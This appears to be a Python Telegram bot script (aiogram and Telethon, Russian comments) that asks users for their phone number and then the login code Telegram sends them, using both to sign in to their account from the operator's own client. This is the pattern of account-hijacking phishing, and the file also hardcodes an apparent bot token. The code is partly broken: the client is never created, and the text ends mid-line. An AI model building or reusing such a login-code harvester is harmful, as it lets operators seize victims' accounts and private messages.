import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode
from aiogram.utils import executor
from telethon import TelegramClient
import asyncio

# Ваши данные API, которые вы получили на my.telegram.org
bot_token = '7170574668:AAGofQcnjWArahHGhaEREF8qiZ9-9ENkZsk'

# Создаем TelegramClient и Bot
#client = TelegramClient('session_name', api_id, api_hash)
bot = Bot(token=bot_token)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

# Логирование
logging.basicConfig(level=logging.INFO)

# Словарь для хранения состояния пользователя
user_state = {}

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("Добро пожаловать! Пожалуйста, введите ваш номер телефона в международном формате.")

@dp.message_handler(lambda message: message.text and message.text.startswith('+'))
async def get_phone_number(message: types.Message):
    phone_number = message.text
    user_state[message.from_user.id] = {'phone_number': phone_number}
    try:
        await client.connect()
        phone_code_hash = await client.send_code_request(phone_number)
        user_state[message.from_user.id]['phone_code_hash'] = phone_code_hash
        await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
    except Exception as e:
        await message.reply(f"Произошла ошибка: {e}")

@dp.message_handler(lambda message: message.text and message.from_user.id in user_state and 'phone_code_hash' in user_state[message.from_user.id])
async def get_code(message: types.Message):
    code = message.text
    phone_number = user_state[message.from_user.id]['phone_number']
    phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
    try:
        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
        await message.reply("Успешная авторизация!")
    except Exception as e:
        await message.reply(f"Произошла ошибка: {e}")
    finally:
        await client.disconnect()
        user_state.pop(message.from_user.id, None)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=T
